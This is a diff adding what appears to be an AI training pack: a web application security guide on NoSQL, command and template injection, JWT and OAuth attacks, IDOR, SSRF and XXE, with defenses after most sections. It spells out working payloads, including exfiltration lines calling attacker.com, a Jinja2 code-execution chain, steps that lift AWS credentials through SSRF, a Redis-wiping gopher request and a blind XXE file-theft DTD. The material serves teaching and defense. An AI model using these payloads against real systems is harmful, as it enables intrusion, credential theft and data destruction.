@@ -1,0 +1,418 @@
+================================================================================
+TITAN AI — TRAINING PACK 011: WEB APPLICATION SECURITY — DEEP PROFESSIONAL GUIDE
+OWASP TOP 10 DEEP DIVE, EXPLOITATION, BYPASSES, SECURE CODING
+================================================================================
+
+================================================================================
+PART 1: INJECTION ATTACKS (BEYOND BASIC SQL INJECTION)
+================================================================================
+
+--- NOSQL INJECTION ---
+
+MongoDB injection (different from SQL but equally dangerous):
+
+VULNERABLE CODE:
+  // Express.js + MongoDB
+  app.post('/login', async (req, res) => {
+    const user = await db.users.findOne({
+      username: req.body.username,
+      password: req.body.password
+    });
+    if (user) res.send('Logged in!');
+  });
+
+ATTACK — MongoDB operators injected as JSON:
+  Request body: {"username": "admin", "password": {"$gt": ""}}
+  
+  MongoDB operator $gt means "greater than."
+  "" (empty string) is "less than" any real password.
+  So: Find user where username=admin AND password > "" → returns the admin user.
+  
+  Or even simpler:
+  {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+  → Finds ANY user matching any username and any password.
+
+BLIND NoSQL injection (extracting data character by character):
+  {"username": "admin", "password": {"$regex": "^a"}}  → Does password start with 'a'?
+  {"username": "admin", "password": {"$regex": "^b"}}  → Does password start with 'b'?
+  ... automate until you find each character
+
+DEFENSE:
+  // Always use parameterized queries / schema validation
+  const schema = Joi.object({
+    username: Joi.string().alphanum().required(),
+    password: Joi.string().required()
+  });
+  const { error } = schema.validate(req.body);
+  if (error) return res.status(400).send(error.details[0].message);
+
+--- COMMAND INJECTION ---
+
+CONTEXT: Server-side code that passes user input to system shell.
+
+VULNERABLE (Python Flask):
+  @app.route('/ping')
+  def ping():
+      host = request.args.get('host')
+      output = subprocess.check_output(f"ping -c 1 {host}", shell=True)
+      return output
+
+BASIC ATTACK:
+  /ping?host=8.8.8.8; cat /etc/passwd
+  /ping?host=8.8.8.8 && whoami
+  /ping?host=8.8.8.8 | id
+  /ping?host=$(whoami)
+  /ping?host=`id`
+
+BLIND COMMAND INJECTION (no output returned):
+  // Can't see output — use out-of-band channel
+  /ping?host=8.8.8.8; curl http://attacker.com/?data=$(whoami | base64)
+  /ping?host=8.8.8.8; nslookup $(whoami).attacker.com
+  
+  // Time-based detection:
+  /ping?host=8.8.8.8; sleep 5   → Page takes 5+ seconds = injectable
+
+FILTER BYPASS TECHNIQUES:
+  // Filter blocks: ;, &&, |
+  // Bypass with newline:
+  /ping?host=8.8.8.8%0awhoami   → %0a = URL-encoded newline
+  
+  // Filter blocks space:
+  /ping?host=8.8.8.8;cat${IFS}/etc/passwd   → ${IFS} = Internal Field Separator (space in bash)
+  /ping?host=8.8.8.8;cat</etc/passwd         → < redirects file as input
+  
+  // Filter checks for /etc/passwd literally:
+  /ping?host=8.8.8.8;cat /???/p?sswd        → Glob expansion: /etc/passwd
+  /ping?host=8.8.8.8;cat /etc/pa'ss'wd      → Quoted split: same as /etc/passwd
+
+DEFENSE (Python):
+  import shlex
+  import subprocess
+  
+  # Use list format (never shell=True with user input)
+  subprocess.run(["ping", "-c", "1", host])  # Safe — no shell interpolation
+  
+  # Or validate strictly
+  import ipaddress
+  try:
+      ipaddress.ip_address(host)  # Raises ValueError if not valid IP
+  except ValueError:
+      return "Invalid IP", 400
+
+--- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
+
+CONTEXT: Template engines render user input. If input is rendered as template code:
+
+TEST PAYLOAD (universal detection):
+  {{7*7}}    → If page shows "49" → Jinja2 (Python) or Twig (PHP)
+  ${7*7}     → If page shows "49" → Freemarker (Java), EL injection
+  #{7*7}     → If page shows "49" → Pebble (Java)
+  *{7*7}     → If page shows "49" → Spring (Java)
+
+JINJA2 EXPLOITATION (Python):
+  // Read files:
+  {{config.items()}}   → Leaks Flask config including SECRET_KEY
+  
+  // RCE through Python class hierarchy:
+  {{''.__class__.__mro__[1].__subclasses__()}}
+  // Lists all Python subclasses loaded in memory
+  // Find: <class 'subprocess.Popen'> at index N
+  
+  {{''.__class__.__mro__[1].__subclasses__()[N](['id'], stdout=-1, stderr=-1).communicate()}}
+  // Executes 'id' command
+  
+  // Shorter RCE (Python 3):
+  {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+DEFENSE:
+  # Never render user input as template directly
+  # WRONG:
+  template = Template(f"Hello {user_input}")  # User input is template code
+  
+  # RIGHT:
+  template = Template("Hello {{ name }}")
+  template.render(name=user_input)  # User input is a variable value, not code
+
+================================================================================
+PART 2: AUTHENTICATION AND SESSION ATTACKS
+================================================================================
+
+--- JWT ATTACKS ---
+
+JWT STRUCTURE: header.payload.signature (base64url encoded)
+  Header: {"alg": "HS256", "typ": "JWT"}
+  Payload: {"sub": "user123", "role": "user", "exp": 1735689600}
+  Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret_key)
+
+ATTACK 1 — None Algorithm:
+  Original: {"alg": "HS256"}
+  Modified: {"alg": "none"}
+  Remove signature portion entirely
+  Many vulnerable libraries accept this without verification
+  
+  Tool: python jwt_tool.py <token> -X a
+  Effect: Forge any claim (role: admin) without knowing the secret
+
+ATTACK 2 — Algorithm Confusion (RS256 → HS256):
+  Original token uses RS256 (asymmetric — private key signs, public key verifies)
+  Attack: Switch to HS256, sign with the public key (which you have)
+  Vulnerable library verifies HS256 with the "public key" — which you just used to sign
+  
+  # Get public key from JWKS endpoint: /.well-known/jwks.json
+  # Create new token:
+  python jwt_tool.py <token> -S hs256 -k public.pem -I -pc role -pv admin
+
+ATTACK 3 — Weak Secret Brute Force:
+  hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... rockyou.txt
+  
+  Common weak secrets: "secret", "password", "jwt_secret", company_name, "1234567890"
+
+ATTACK 4 — JKU/X5U Header Injection:
+  Add header: {"jku": "https://attacker.com/jwks.json"}
+  Host malicious JWKS on your server
+  Server fetches your JWKS to verify token → you control verification → forge anything
+
+DEFENSE:
+  - Never implement JWT verification yourself — use audited library
+  - Explicitly specify allowed algorithms: jwt.decode(token, key, algorithms=["HS256"])
+  - Use RS256 with properly isolated private key (never on web server)
+  - Validate jku/x5u headers against allowlist
+  - Use short expiration + refresh token pattern
+  - Maintain token revocation list for sensitive operations
+
+--- OAUTH 2.0 ATTACK SURFACE ---
+
+REDIRECT URI MANIPULATION:
+  Legitimate: ?redirect_uri=https://app.com/callback
+  Attack: ?redirect_uri=https://app.com.attacker.com/callback
+           ?redirect_uri=https://app.com/callback/../../../attacker.com
+  
+  If server does prefix matching instead of exact matching:
+  Code is sent to attacker's site in the redirect.
+
+STATE PARAMETER ATTACKS:
+  The state parameter prevents CSRF in OAuth flow.
+  If application doesn't validate state → CSRF on OAuth completion.
+  
+  Attacker starts auth flow, captures the URL up to state parameter.
+  Victim clicks that URL. Victim's account linked to attacker's OAuth identity.
+
+PKCE DOWNGRADE:
+  Public clients should use PKCE (code_verifier/code_challenge).
+  If server allows PKCE to be skipped → Code interception attack possible.
+
+================================================================================
+PART 3: ACCESS CONTROL AND BUSINESS LOGIC ATTACKS
+================================================================================
+
+--- INSECURE DIRECT OBJECT REFERENCE (IDOR) ---
+
+EXAMPLE 1 — Horizontal privilege escalation:
+  GET /api/v1/invoices/1234  → Returns invoice #1234 (yours)
+  GET /api/v1/invoices/1235  → Returns invoice #1235 (someone else's!)
+  
+  Test: Modify any ID parameter to another value.
+  Automate: Burp Intruder — enumerate 1000-9999, flag any 200 response
+
+EXAMPLE 2 — IDOR in file downloads:
+  GET /download?file=receipt_2024_user123.pdf   (your receipt)
+  GET /download?file=receipt_2024_user456.pdf   (someone else's receipt)
+  
+  Pattern: User-specific identifiers in parameters. Test by changing identifier.
+
+EXAMPLE 3 — IDOR through indirect reference:
+  /api/profile        → Returns your profile (no ID in URL)
+  But token JWT claim: {"sub": "user123"}
+  Change JWT claim: {"sub": "admin"} → If IDOR and weak JWT = admin profile
+
+MASS ASSIGNMENT IDOR:
+  Update profile endpoint accepts JSON body.
+  Legitimate: {"name": "John", "email": "john@example.com"}
+  Attack: {"name": "John", "email": "john@example.com", "role": "admin", "verified": true}
+  
+  If backend blindly maps all fields to DB object: Escalate privileges via mass assignment.
+  
+  Defense:
+  # Allowlist fields explicitly
+  allowed_fields = {'name', 'email', 'bio'}
+  safe_data = {k: v for k, v in request.json.items() if k in allowed_fields}
+  user.update(**safe_data)
+
+--- BUSINESS LOGIC VULNERABILITIES ---
+
+RACE CONDITION IN PURCHASES:
+  Your account has $100. An item costs $80.
+  Normal: Buy → deduct $80 → balance $20.
+  
+  Race: Send 5 simultaneous purchase requests.
+  All 5 read balance = $100 (before any deduction committed).
+  All 5 deduct $80 from $100.
+  Result: 5 items received, balance shows -$300 (or crashes, or allows all 5).
+  
+  Real world: Coupon codes applied multiple times simultaneously.
+  Defense: Database-level atomic operations. SELECT FOR UPDATE. Idempotency keys.
+
+NEGATIVE QUANTITY ATTACK:
+  Endpoint: POST /cart {"item_id": 123, "quantity": 5}  → Adds 5 items
+  Attack: POST /cart {"item_id": 123, "quantity": -5}
+  If not validated: Cart price = -$50. Checkout = you receive money and items.
+  
+  Always validate: quantity > 0, price > 0, ALL numeric inputs have range validation.
+
+FORCED BROWSING AND STATE SKIP:
+  Multi-step process: Step1 → Step2 → Step3 → Payment → Complete
+  Skip directly to: /complete?order_id=XXXX
+  
+  If server doesn't verify all prior steps completed: Order marked complete without payment.
+  Defense: Server-side state tracking, never trust URL-based step indicators.
+
+================================================================================
+PART 4: ADVANCED WEB ATTACKS
+================================================================================
+
+--- SSRF (SERVER-SIDE REQUEST FORGERY) DEEP DIVE ---
+
+WHAT IT IS:
+  Application fetches URL provided by user.
+  Attacker provides URL pointing to internal resources.
+  Server makes request on attacker's behalf from inside the network.
+
+BASIC TEST:
+  // Find parameters that fetch URLs
+  url=, webhook=, redirect=, proxy=, fetch=, download=
+  
+  Test: url=http://169.254.169.254/  (AWS metadata — internal only)
+  If returns data: SSRF confirmed. AWS metadata accessible.
+
+AWS METADATA EXPLOITATION:
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  → Lists IAM role name
+  
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
+  → Returns: AccessKeyId, SecretAccessKey, Token (temp credentials)
+  
+  Use these credentials with AWS CLI:
+  AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
+  aws s3 ls  → List all S3 buckets
+  aws iam list-users  → List all IAM users
+  → Full AWS compromise from SSRF.
+
+SSRF FILTER BYPASSES:
+  // Filter blocks 169.254.169.254
+  // Bypass with alternative representations:
+  http://169.254.169.254/    → Direct IP
+  http://169.254.169.254/    → Same, blocked
+  http://0251.0376.0251.0376/ → Octal notation: 169.254.169.254
+  http://0xA9FEA9FE/         → Hex notation: 0xA9=169, 0xFE=254
+  http://2852039166/         → Decimal: 169*16777216 + 254*65536 + 169*256 + 254
+  http://169.254.169.254.xip.io/  → Resolves to 169.254.169.254 via wildcard DNS
+  http://attacker.com/  → Redirect attacker.com → 169.254.169.254 after filter passes
+  
+  Protocol confusion:
+  file:///etc/passwd     → Read local files
+  dict://127.0.0.1:6379/ → Access Redis without auth (common internal service)
+  gopher://127.0.0.1:6379/_FLUSHALL  → Send raw bytes to Redis (delete everything)
+  sftp://127.0.0.1:22  → Probe SSH
+  http://localhost:5432  → Probe PostgreSQL
+
+--- XXE (XML EXTERNAL ENTITY) ---
+
+VULNERABLE: Application parses XML from user input.
+
+BASIC FILE DISCLOSURE:
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  ]>
+  <root>&xxe;</root>
+  
+  Server response includes contents of /etc/passwd.
+
+SSRF VIA XXE:
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">]>
+
+BLIND XXE (out-of-band):
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+  
+  // evil.dtd on attacker server:
+  <!ENTITY % data SYSTEM "file:///etc/passwd">
+  <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%data;'>">
+  %exfil;
+  %send;
+  
+  // /etc/passwd contents arrive as URL parameter to attacker's server
+
+DEFENSE:
+  - Disable DTD processing completely
+  # Python lxml:
+  from lxml import etree
+  parser = etree.XMLParser(resolve_entities=False, no_network=True)
+  
+  # Java:
+  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+  dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+================================================================================
+PART 5: SECURE CODE REVIEW — WHAT TO LOOK FOR
+================================================================================
+
+HIGH-VALUE CODE PATTERNS TO HUNT:
+
+Security-sensitive functions to grep for:
+  # Python
+  grep -r "subprocess\|os\.system\|eval\|exec\|pickle\.loads\|yaml\.load" src/
+  grep -r "shell=True" src/
+  grep -r "request\.args\|request\.form\|request\.json" src/ | grep -v "validated\|schema"
+  
+  # JavaScript/Node
+  grep -r "eval\|Function\|exec\|spawn\|child_process" src/
+  grep -r "innerHTML\|dangerouslySetInnerHTML" src/  # XSS
+  grep -r "req\.body\|req\.query\|req\.params" src/ | head -50
+  
+  # Java
+  grep -r "Runtime\.exec\|ProcessBuilder\|createTempFile\|File(" src/
+  grep -r "Statement.execute\|prepareStatement" src/  # Check for string concat
+
+AUTHENTICATION CHECKLIST:
+  □ Passwords hashed with bcrypt/argon2/scrypt (NOT md5/sha1/sha256 alone)
+  □ Password comparison uses timing-safe compare function
+  □ Account lockout after N failed attempts (with exponential backoff)
+  □ Password reset tokens: Cryptographically random, single-use, short expiry
+  □ Session tokens: Regenerated after login (prevents session fixation)
+  □ Session tokens: Invalidated on logout (server-side revocation)
+  □ MFA implemented and enforced for privileged accounts
+  □ JWT: Algorithm explicitly specified, weak algorithm not accepted
+
+COMMON SECURE CODING PATTERNS:
+  
+  // Parameterized query (Python, correct)
+  cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+  
+  // Password hashing (correct)
+  import bcrypt
+  hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+  # Verify:
+  bcrypt.checkpw(attempt.encode(), hashed)  # Timing-safe automatically
+  
+  // Cryptographic random (correct)
+  import secrets
+  token = secrets.token_urlsafe(32)   # 256 bits of random, URL-safe
+  # NOT: random.randint() — predictable
+  
+  // File path traversal prevention (correct)
+  import os
+  def safe_open(base_dir, user_filename):
+      # Resolve to real path, check it's inside base_dir
+      safe_path = os.path.realpath(os.path.join(base_dir, user_filename))
+      if not safe_path.startswith(os.path.realpath(base_dir) + os.sep):
+          raise ValueError("Path traversal detected")
+      return open(safe_path)
+
+================================================================================
+END OF PACK 011: WEB APPLICATION SECURITY
+Total: NoSQL injection, command injection + bypasses, SSTI, JWT attacks (all variants),
+OAuth attack surface, IDOR + mass assignment, business logic (race conditions,
+negative quantity, state skip), SSRF deep with AWS metadata exploitation + filter bypasses,
+XXE (basic/blind/SSRF), secure code review patterns and checklists.
+================================================================================
